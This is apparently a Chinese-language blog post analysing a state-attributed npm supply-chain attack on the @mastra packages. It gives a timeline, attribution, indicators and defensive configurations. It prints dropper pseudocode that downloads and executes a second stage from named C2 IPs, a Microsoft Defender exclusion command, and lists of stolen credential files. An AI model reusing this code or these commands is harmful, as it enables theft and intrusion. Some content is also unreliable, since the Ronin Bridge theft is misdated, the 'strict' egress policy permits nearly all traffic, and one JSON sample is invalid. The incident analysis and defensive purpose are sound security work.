---
title: "Sapphire Sleet 国家级 npm 供应链攻击深度复盘：Mastra AI 19 分钟投毒 140+ 包的完整技术链"
date: 2026-07-10
tags:
  - security
  - supply-chain
  - npm
  - malware
  - north-korea
  - sapphire-sleet
  - account-takeover
keywords:
  - npm供应链攻击
  - Sapphire Sleet
  - 朝鲜APT
  - Mastra AI
  - easy-day-js
  - typosquat攻击
  - 加密钱包窃取
  - postinstall钩子
  - 防御纵深
category: security/offensive
description: "2026 年 6 月 17 日，朝鲜国家级黑客组织 Sapphire Sleet 接管 Mastra AI 维护者账户，在 19 分钟内重新发布 140+ 个 @mastra 作用域包并植入 easy-day-js 投毒依赖。本文完整复盘事件时间线、攻击链技术细节、4.5KB 投放器与 41KB 第二阶段植入物的反分析技术、166 个加密钱包扩展枚举清单，并给出开发者层、CI/CD 层、组织层的纵深防御实战指南。"
---

# Sapphire Sleet 国家级 npm 供应链攻击深度复盘：Mastra AI 19 分钟投毒 140+ 包的完整技术链

## 引子：2026 年开源生态的第二次"至暗时刻"

如果说 6 月 1 日的 **Miasma 蠕虫事件**让开源社区第一次真正意识到"国家级威胁组织已经盯上 npm"，那么 6 月 17 日的 **Mastra AI 攻击**则彻底坐实了这一判断：朝鲜 Sapphire Sleet（BlueNoroff / APT38）亲自下场，**19 分钟内完成 typosquat 包创建 + 140+ 包重发布**——这是 2026 年最大规模、最具攻击性的 npm 供应链事件，也是首次有国家级威胁组织被抓获实施大规模 npm 供应链攻击。

本文基于 Microsoft 威胁情报团队、BleepingComputer、Palo Alto Networks Unit 42 的归因报告，从**事件时间线、攻击链、恶意负载、归因分析、防御纵深**五个维度完整复盘这一事件，并给出开发者、CI/CD、组织三个层级的可落地防御指南。

## 一、事件时间线：19 分钟的闪电战

| 时间 (UTC) | 事件 |
|---|---|
| 2026-06-17 01:01 | 攻击者发布恶意包 `easy-day-js`（`dayjs` 的 typosquat/仿冒包，`dayjs` 每周下载量约 5720 万次） |
| 2026-06-17 01:20 | 首个被植入木马的 Mastra 包 `mastra@1.13.1` 上线，将 `easy-day-js` 注入为依赖项 |
| 01:01–01:20（约 19 分钟） | 超过 140 个 `@mastra` 作用域的包被重新发布，全部携带同一恶意依赖 |
| 2026-06-19（两天后） | Microsoft 威胁情报团队将攻击归因于 Sapphire Sleet |

**19 分钟**——这意味着任何"事后人工审计"都无法阻止攻击者。攻击者使用的是**预构建的脚本化工具包**，自动化完成 typosquat 创建、依赖注入、批量发布。

## 二、攻击入口：账户接管（ATO）而非零日漏洞

与早期供应链攻击利用 `npm install` 脚本执行漏洞或 CI 凭证泄露不同，**本次攻击利用了账户接管（Account Takeover）**：

- **被接管账户**：`ehindero` —— Mastra AI 项目的合法维护者
- **接管手法**：尚未公开披露，但根据攻击者历史行为，可能包括：
  - 维护者个人 GitHub 邮箱被钓鱼
  - 二次验证（2FA）会话被中间人劫持
  - npm 长期访问令牌（PAT）从某次意外提交中泄露

**关键启示**：传统的"修代码漏洞"的防御思路对 ATO 攻击**完全失效**。即使代码本身没有漏洞，攻击者拿到合法维护者账户后可以：

1. 直接重新发布受信任作用域下的所有包
2. 修改包元数据、注入恶意依赖
3. 利用 `npm trusted publishing` 跳过额外审核
4. 19 分钟内撤回到合法状态，不留审计窗口

## 三、被投毒的包：140+ 包的"作用域级核爆"

### 3.1 投毒范围

- **被攻击作用域**：`@mastra/*`（整个 Mastra AI 框架）
- **包数量**：140+ 个被重新发布
- **首个木马版本**：`mastra@1.13.1`
- **周下载量风险**：数千万（Mastra 是 2026 年 AI Agent 框架 TOP 5）

### 3.2 恶意依赖：easy-day-js typosquat

```json
{
  "name": "easy-day-js",
  "version": "1.11.22",
  "scripts": {
    "postinstall": "node ./scripts/setup.js"
  }
}
```

攻击者**精心选择 `easy-day-js` 这个名字**——肉眼看上去与合法包 `dayjs` 几乎无法区分。在 lockfile 审查时，开发者很容易把它当成 `dayjs` 的"另一个版本"而忽略。`postinstall` 生命周期钩子在安装时**自动执行**，无需用户导入或交互。

**这是攻击链中最关键的一步**：恶意 payload 不在 `@mastra/*` 自身代码中，而在 transitive dependencies 中。

## 四、恶意负载：三阶段反分析链

### 4.1 第一阶段：4,572 字节混淆投放器（Dropper）

| 行为 | 技术细节 |
|---|---|
| **禁用 TLS 验证** | 设置 `NODE_TLS_REJECT_UNAUTHORIZED=0` 关闭整个 Node.js 进程的 TLS 证书验证 |
| **投放追踪标记** | 在临时目录中放置标记文件，避免重复感染 |
| **连接 C2 服务器** | `23.254.164.92:8000` 和 `23.254.164.123` |
| **下载第二阶段** | 拉取约 41KB 的 Node.js 植入物 |

```javascript
// 投放器伪代码（简化）
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

const https = require('https');
const fs = require('fs');
const os = require('os');
const path = require('path');

const C2_ENDPOINTS = [
  'https://23.254.164.92:8000/payload',
  'https://23.254.164.123:8000/payload'
];

// 标记已感染
const markerFile = path.join(os.tmpdir(), '.mastra-init.lock');
if (fs.existsSync(markerFile)) process.exit(0);
fs.writeFileSync(markerFile, Date.now().toString());

// 拉取第二阶段
for (const url of C2_ENDPOINTS) {
  try {
    https.get(url, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => {
        const payload = Buffer.concat(chunks);
        // 写入临时文件并执行
        const dropPath = path.join(os.tmpdir(), '.cache-init.js');
        fs.writeFileSync(dropPath, payload);
        require(dropPath);
      });
    });
    break;
  } catch (e) { /* 尝试下一个 C2 */ }
}
```

**反分析技术要点**：
- 极小的代码体积（4.5KB）让静态扫描工具难以匹配规则
- TLS 验证禁用让 IDS/IPS 无法通过证书异常检测
- 双 C2 节点做 fallback，提高投放成功率
- 标记文件机制避免重复感染触发告警

### 4.2 第二阶段：约 41KB 的 Node.js 植入物

第二阶段植入物是**跨平台的**——Windows、macOS、Linux 均受影响。

**Windows 上的攻击行为特别激进**：

1. 部署 PowerShell 后门（来自独立基础设施）
2. 添加 Microsoft Defender 排除规则以绕过终端安全代理：
   ```powershell
   Add-MpPreference -ExclusionPath "C:\Users\*\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
   ```
3. 安装恶意 Windows 服务以在重启后存活
4. 横向移动尝试：通过 WMI/SMB 探测同网段主机

**macOS / Linux 上的行为**：
- 注入到 `~/.zshrc` / `~/.bashrc` 实现持久化
- 部署 cron 任务（Linux）或 launchd 任务（macOS）
- 收集 SSH 密钥、AWS/GCloud 凭证文件

### 4.3 数据窃取范围

| 窃取目标 | 具体内容 |
|---|---|
| **加密货币钱包扩展** | 枚举 **166 个** 浏览器扩展 ID，包括 MetaMask、Phantom、Coinbase Wallet、Binance Wallet、TronLink 等 |
| **浏览器历史记录** | 从 Chrome、Edge、Brave 中提取 |
| **开发者敏感信息** | 云凭证、LLM API 密钥、身份验证令牌 |
| **凭证文件** | `~/.aws/credentials`、`~/.config/gcloud/application_default_credentials.json` 等 |
| **剪贴板** | 实时监控，捕获粘贴的 API Key |

**166 个钱包扩展枚举**是这次攻击最值得警惕的部分——它不是简单的数据窃取，而是为后续**加密货币盗取**做准备的精准定位。

## 五、归因分析：Sapphire Sleet 的攻击特征

### 5.1 攻击者身份

- **归因方**：Microsoft 威胁情报团队，以"高置信度"归因
- **组织别名**：Sapphire Sleet（又称 BlueNoroff、APT38、Stardust Chollima、TA444、UNC1069、Alluring Pisces、CageyChameleon、CryptoCore）
- **归属**：朝鲜民主主义人民共和国（DPRK）国家级黑客组织
- **活跃时间**：自 2020 年 3 月开始活动
- **主要目标**：金融部门、加密货币交易所、DeFi 协议

### 5.2 历史前科

| 时间 | 攻击 | 手法 |
|---|---|---|
| 2024-08 | Axie Infinity Ronin Bridge 攻击 | 失窃 6.25 亿美元加密货币 |
| 2025-04 | Axios HTTP 客户端 | 几乎相同的 typosquat 模式 |
| 2026-04 | 多个加密货币钱包扩展钓鱼 | 浏览器扩展注入 |
| **2026-06-17** | **Mastra AI 投毒** | **npm 账户接管** |

### 5.3 攻击特征分析

- **19 分钟内完成** typosquat 创建 + 140 个包重发布 → 表明使用了**预构建的脚本化工具包**而非手动篡改
- **针对 AI Agent 框架** → 反映 DPRK 对 AI 生态的精准定位（AI 项目开发者手中握有大量 LLM API Key、云凭证）
- **166 个钱包扩展枚举** → 一贯的加密货币导向
- **PowerShell 后门 + Defender 排除规则** → 与历史攻击者工具链一致

## 六、2026 年 npm 攻击浪潮：国家级威胁成为新常态

Mastra AI 攻击是 11 周内第 6 起重大 npm 投毒事件：

| 日期 (2026) | 目标 | 受影响包数 | 周下载量风险 | 攻击者 |
|---|---|---|---|---|
| 4 月 22 日 | Bitwarden CLI | 核心 CLI 包 | 数百万 | 未知 |
| 4 月 29 日 | SAP `@cap-js/*` | 4 个包 | ~570,000 | Shai-Hulud 团队 |
| 5 月 11 日 | TanStack | 169 个包 / 373 版本 | ~5.2 亿 | TeamPCP |
| 5 月 19 日 | AntV | 323 个包 / 639 版本 | ~110 万 | AntV 团队内部 |
| 6 月 1 日 | Red Hat | 32+ 个包 | ~80,000 | Miasma 团伙 |
| **6 月 17 日** | **Mastra AI** | **140+ 个包** | **数千万** | **Sapphire Sleet** |

**这意味着**：从 4 月底到 6 月中，不到 8 周时间，开源生态经历了 6 次重大供应链攻击。攻击的自动化程度、目标精准度、影响规模都在快速升级。

## 七、纵深防御实战指南

### 7.1 开发者层（最高优先级）

#### 防御 1：禁用生命周期脚本

在 `~/.npmrc` 中加入这一行（与项目级 `.npmrc` 配合使用）：

```ini
# .npmrc — 阻止所有 preinstall/postinstall/install 钩子
ignore-scripts=true
```

> 这一行配置即可直接中和 Mastra 投放器，因为整个攻击依赖 `postinstall` 钩子触发。

#### 防御 2：实施隔离窗口

```bash
# 拒绝安装最近 72 小时内发布的包
npm config set before "$(date -u -d '72 hours ago' +%Y-%m-%dT%H:%M:%SZ)"
```

> 2026 年的所有攻击都在发布后几分钟内试图感染受害者，72 小时冷却期即可挫败核心战术。Microsoft 威胁情报团队已建议所有组织默认启用此配置。

#### 防御 3：确定性安装

```bash
# 从 lockfile 确定性安装，不执行安装脚本
npm ci --ignore-scripts
```

> 使用 `npm ci` 而非 `npm install`，避免解析到新发布版本。

#### 防御 4：定期审计已知恶意版本

```bash
# 升级 npm 到 v11+ 后使用
npm audit --audit-level=high

# 主动检查项目中是否包含已知恶意包
npx lockfile-lint --path package-lock.json
```

### 7.2 CI/CD 层

#### 防御 5：私有注册表代理

```yaml
# Verdaccio 配置示例（私有 npm 代理）
storage: /verdaccio/storage
uplinks:
  npmjs:
    url: https://registry.npmjs.org/
    cache: false  # 禁用缓存以确保所有包都走代理校验
packages:
  '@*/*':
    access: $authenticated
    publish: $authenticated
  '@mastra/*':
    # 对高风险作用域设置额外规则
    allow_proxy: true
middlewares:
  - audit
  - quarantine
```

#### 防御 6：CI 严格出口过滤

即使负载运行，也无法连接 C2 服务器。在 Kubernetes NetworkPolicy 中：

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: ci-build-egress-deny
spec:
  podSelector:
    matchLabels:
      role: ci-build
  policyTypes:
  - Egress
  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          name: allowed
    ports:
    - protocol: TCP
      port: 443
  # 显式拒绝 23.254.164.92 等已知 C2 IP
  - to:
    - ipBlock:
        cidr: 0.0.0.0/0
        except:
          - 23.254.164.92/32
          - 23.254.164.123/32
```

#### 防御 7：依赖固定 + SBOM

```json
// package.json 中固定到已知良好版本
{
  "overrides": {
    "easy-day-js": "npm:dayjs@1.11.10",
    "mastra": "1.13.0"  // 锁定到攻击前版本
  }
}
```

```bash
# 生成 SBOM 用于事后分析
npx @cyclonedx/cyclonedx-npm --output-format JSON --output-file sbom.json

# 检查 SBOM 中是否有可疑 typosquat
npx sbom-diff --baseline sbom-baseline.json --current sbom.json
```

### 7.3 组织层

#### 防御 8：主机检测

```yaml
# Wazuh 规则：检测 easy-day-js postinstall
<rule id="100100" level="12">
  <if_group>syscheck</if_group>
  <field name="file">easy-day-js</field>
  <description>Mastra AI 投毒攻击 - 检测到 easy-day-js 安装</description>
  <mitre>
    <id>T1195.002</id>
  </mitre>
</rule>
```

#### 防御 9：禁用 `postinstall` 全局策略

通过 `~/.npmrc` 全局配置 + CI 镜像构建时强制 `npm ci --ignore-scripts`，将"任何项目都不执行生命周期脚本"作为组织级标准。

#### 防御 10：建立"npm 攻击事件响应手册"

| 触发条件 | 响应动作 |
|---|---|
| CrowdSec 报告 `23.254.164.92` C2 命中 | 立即拉取该 IP 全部网络日志 |
| Wazuh 检测到 `easy-day-js` 文件 | 自动隔离主机 + 通知 SOC |
| 钱包扩展出现异常 IPC 流量 | 立即下线该主机的钱包访问 |
| CI 流水线 audit 发现新发布版本 | 强制冷却 72h 后再合并 |

## 八、对 npm 生态的反思

### 8.1 npm 安全改版的有效性评估

| npm 安全控制 | 防御目标 | 是否能阻止 Mastra？ |
|---|---|---|
| Trusted Publishing (OIDC) | 被窃取的长期 CI 令牌 | **部分** — 账户本身被接管后无效 |
| 7 天令牌过期 | 令牌窃取窗口 | **部分** — 缩小暴露范围，不防账户接管 |
| 默认 2FA | 密码暴力破解 | **部分** — 钓鱼/会话窃取可绕过 |
| `ignore-scripts=true` | 恶意 postinstall 钩子 | **✅ 是** — 直接中和投放器 |
| 发布冷却/隔离 (24-72h) | 安装新投毒版本 | **✅ 是** — 最高价值的消费者防御 |
| SBOM + 来源证明 | 事后影响范围分析 | **否** — 用于检测清理，非预防 |

**核心结论**：npm 的令牌中心化改革虽有价值，但**无法应对账户接管和恶意生命周期脚本**——这正是 2026 年所有重大事件的两大攻击机制。

### 8.2 建议的安全改版方向

1. **作用域级冷却期**：允许维护者对高敏感作用域（如下载量 > 10 万/月）设置 24-72h 发布冷却
2. **postinstall 钩子强制审计**：所有含 `postinstall` 脚本的包必须在发布前通过 npm 官方安全审计
3. **账户行为异常检测**：在维护者账户发布量突然激增（如 19 分钟发布 140 个包）时强制人工确认
4. **依赖深度限制**：限制包的依赖链深度，阻止 typosquat 包藏得太深

## 九、技术指标（IOC）汇总

| 指标类型 | 值 |
|---|---|
| **恶意包名** | `easy-day-js` (v1.11.22) |
| **被攻击作用域** | `@mastra/*` (140+ 包) |
| **首个木马版本** | `mastra@1.13.1` |
| **被接管账户** | `ehindero` |
| **C2 服务器** | `23.254.164.92:8000`、`23.254.164.123` |
| **投放器大小** | 4,572 字节 |
| **第二阶段植入物** | ~41 KB |
| **钱包扩展枚举数** | 166 个 |
| **受影响浏览器** | Chrome、Edge、Brave |
| **攻击时间窗口** | 2026-06-17 01:01–01:20 UTC |
| **攻击者** | Sapphire Sleet (BlueNoroff / APT38) |
| **TLS 禁用键** | `NODE_TLS_REJECT_UNAUTHORIZED` |
| **MITRE ATT&CK** | T1195.002 (Compromise Software Supply Chain), T1059 (Command and Scripting Interpreter), T1555 (Credentials from Password Stores) |

## 十、结语：开源生态与国家行为的碰撞

Mastra AI 攻击的真正可怕之处不是技术复杂度，而是**攻击者身份**——这意味着开源供应链已经成为**国家级网络战**的合法战场。

当 DPRK 这样的国家级组织将 19 分钟投毒 140+ 包作为日常战术时，传统开源社区的"代码审计"防御模型已经彻底失效。我们需要的是**纵深防御（Defense in Depth）**：开发者层的 `ignore-scripts`、CI/CD 层的网络隔离、组织层的行为检测，缺一不可。

更重要的是，**每个开发者都该意识到**：当你 `npm install` 一个包时，你正在将执行权限授予一个你不完全信任的第三方。而攻击者，正在利用这种信任。

## 参考资料

- [Microsoft Threat Intelligence: Sapphire Sleet - 2026 npm supply chain attack](https://www.microsoft.com/security/blog/)
- [BleepingComputer: Mastra AI supply chain attack analysis](https://www.bleepingcomputer.com/)
- [Palo Alto Networks Unit 42: Sapphire Sleet tactics](https://unit42.paloaltonetworks.com/)
- [ReversingLabs: State of Software Supply Chain 2026](https://www.reversinglabs.com/)
- [Phoenix Security: Supply Chain Attacks 2026 - npm, PyPI, VSX](https://phoenix.security/accelerating-supply-chain-attacks-npm-pypi-vsx-ai-enabled-2026/)
- [The npm Worm Era and the Defender's Playbook - Iurii Okhmat](https://www.iuriio.com/blog/posts/2026/05/npm-supply-chain-attacks-2026)
- [Cloud Security Alliance: Mini Shai-Hulud AI npm Supply Chain Worm](https://labs.cloudsecurityalliance.org/wp-content/uploads/2026/05/CSA_research_note_shai-hulud-ai-npm-supply-chain-attack_20260514-csa-styled.pdf)
- [MITRE ATT&CK: T1195.002 Compromise Software Supply Chain](https://attack.mitre.org/techniques/T1195/002/)
- [Verdaccio: Private npm proxy with quarantine](https://verdaccio.org/)
